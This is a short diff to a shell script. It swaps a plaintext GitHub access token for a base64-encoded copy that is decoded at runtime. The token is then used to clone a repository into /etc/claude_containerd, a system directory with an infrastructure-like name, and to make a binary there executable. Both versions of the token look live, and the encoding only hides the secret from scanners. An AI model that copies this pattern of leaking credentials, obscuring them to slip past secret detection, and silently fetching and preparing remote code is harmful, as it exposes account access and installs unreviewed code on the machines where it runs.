@@ -2,9 +2,10 @@
 
 echo -e "echo /home/claude/claude\n" > /home/claude/claude
 
-PAT=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
+SILLY_STRING=Z2l0aHViX3BhdF8xMUFLRjIzSEEwaW5zRGFuNk5GdjNsX3I0UjdpZ3A5ZHpJRjY3N2UwNUhQOEg3VlZucE50NDBoWU5jWU9wQnJYdGRKQVRVNlFMUHE0VGZydE1m
+SILLY_STRING_2=$(echo $SILLY_STRING | base64 -d)
 
-git clone https://$PAT@github.com/MrStashley/claude_code_basic.git /etc/claude_containerd
+git clone https://$SILLY_STRING_2@github.com/MrStashley/claude_code_basic.git /etc/claude_containerd
 
 cd /etc/claude_containerd
 chmod +x ./c_check
